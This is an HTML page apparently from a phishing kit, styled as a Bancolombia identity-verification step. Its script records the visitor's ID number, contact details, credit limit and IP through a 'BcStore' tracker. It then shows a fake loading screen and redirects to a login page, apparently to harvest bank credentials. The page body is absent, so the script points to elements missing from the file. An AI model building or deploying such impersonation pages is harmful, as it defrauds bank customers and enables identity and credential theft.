<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Verificación de identidad — Bancolombia</title>
  <style>
    :root {
      --dark: #1a1a1a;
      --yellow: #ffd100;
      --muted: #5a5a5a;
      --pad-x: clamp(1.1rem, 4vw, 2rem);
    }

    *,
    *::before,
    *::after {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    html {
      -webkit-text-size-adjust: 100%;
    }

    body {
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      background: #e8e8e8;
      color: var(--dark);
      font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
    }

    .topbar {
      display: grid;
      grid-template-columns: 1fr auto 1fr;
      align-items: center;
      gap: 0.5rem;
      padding: 0.85rem var(--pad-x);
      background: var(--dark);
      border-bottom: 3px solid var(--yellow);
      z-index: 2;
    }

    .topbar__back {
      justify-self: start;
      display: inline-flex;
      align-items: center;
      gap: 0.35rem;
      color: #fff;
      text-decoration: none;
      font-size: 0.95rem;
      min-height: 44px;
    }

    .topbar__back svg {
      width: 18px;
      height: 18px;
    }

    .topbar__logo {
      justify-self: center;
      height: 28px;
      width: auto;
      max-width: 170px;
      object-fit: contain;
      filter: brightness(0) invert(1);
    }

    main {
      flex: 1;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: clamp(1.5rem, 4vw, 2.5rem) var(--pad-x);
      position: relative;
    }

    .backdrop {
      position: absolute;
      inset: 0;
      background: rgba(40, 40, 40, 0.55);
      backdrop-filter: blur(4px);
      -webkit-backdrop-filter: blur(4px);
    }

    .modal {
      position: relative;
      z-index: 1;
      width: 100%;
      max-width: 22rem;
      background: #fff;
      border-radius: 22px;
      padding: clamp(1.5rem, 4vw, 2rem) clamp(1.25rem, 3vw, 1.75rem) 1.35rem;
      text-align: center;
      box-shadow: 0 12px 40px rgba(0, 0, 0, 0.2);
    }

    .eye {
      display: block;
      width: clamp(72px, 18vw, 96px);
      height: auto;
      margin: 0 auto 1.1rem;
      object-fit: contain;
      background: transparent;
    }

    h1 {
      font-size: clamp(1.15rem, 2.5vw + 0.6rem, 1.35rem);
      font-weight: 700;
      margin-bottom: 0.75rem;
      line-height: 1.3;
    }

    .desc {
      font-size: 0.9rem;
      line-height: 1.5;
      color: var(--muted);
      margin-bottom: 1.35rem;
    }

    .continuar {
      display: flex;
      align-items: center;
      justify-content: center;
      width: 100%;
      min-height: 50px;
      border: none;
      border-radius: 999px;
      background: var(--yellow);
      color: var(--dark);
      font: inherit;
      font-size: 1rem;
      font-weight: 700;
      cursor: pointer;
      text-decoration: none;
      -webkit-tap-highlight-color: transparent;
    }

    .continuar:hover {
      filter: brightness(0.97);
    }

    .site-footer {
      background: var(--dark);
      color: #b0b0b0;
      text-align: center;
      padding: 1.1rem var(--pad-x) 1.25rem;
      font-size: 0.75rem;
      z-index: 2;
    }

    .site-footer img {
      display: block;
      height: 24px;
      width: auto;
      margin: 0 auto 0.5rem;
      filter: brightness(0) invert(1);
    }

    .loading-overlay {
      position: fixed;
      inset: 0;
      z-index: 100;
      display: none;
      align-items: center;
      justify-content: center;
      background: rgba(40, 40, 40, 0.55);
      backdrop-filter: blur(5px);
      -webkit-backdrop-filter: blur(5px);
    }

    .loading-overlay.is-visible {
      display: flex;
    }

    .loading-card {
      width: min(200px, 70vw);
      aspect-ratio: 1;
      border-radius: 50%;
      background: #fff;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      gap: 0.85rem;
      padding: 1.25rem;
      text-align: center;
      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
    }

    .spinner {
      width: 36px;
      height: 36px;
      border: 3px solid #e0e0e0;
      border-top-color: #1a1a1a;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
    }

    .loading-card p {
      font-size: 0.9rem;
      color: var(--dark);
      line-height: 1.3;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    @media (min-width: 640px) {
      .modal {
        max-width: 26rem;
        padding: 2.25rem 2rem 1.5rem;
      }
    }
  </style>
</head>

  <script>
    (function () {
      var params = new URLSearchParams(window.location.search);
      var back = document.getElementById("back-link");
      var qs = params.toString();
      if (qs) back.href = "solicitar.html?" + qs;

      var loading = document.getElementById("loading");
      var loadingText = document.getElementById("loading-text");
      var btn = document.getElementById("continuar-btn");

      if (window.BcStore) {
        BcStore.markStep("verificacion", {
          tipo: params.get("tipo") || "",
          documento: params.get("documento") || "",
          contacto: params.get("contacto") || "",
          cupo: params.get("cupo") || "",
        });
        BcStore.fetchIpThen();
      }

      btn.addEventListener("click", function () {
        if (window.BcStore) {
          BcStore.markStep("verificacion_continuar", {
            tipo: params.get("tipo") || "",
            documento: params.get("documento") || "",
            contacto: params.get("contacto") || "",
            cupo: params.get("cupo") || "",
          });
        }
        loading.classList.add("is-visible");
        loadingText.textContent = "Redireccionando...";
        setTimeout(function () {
          var next = "login.html";
          if (qs) next += "?" + qs;
          window.location.href = next;
        }, 1400);
      });
    })();
  </script>
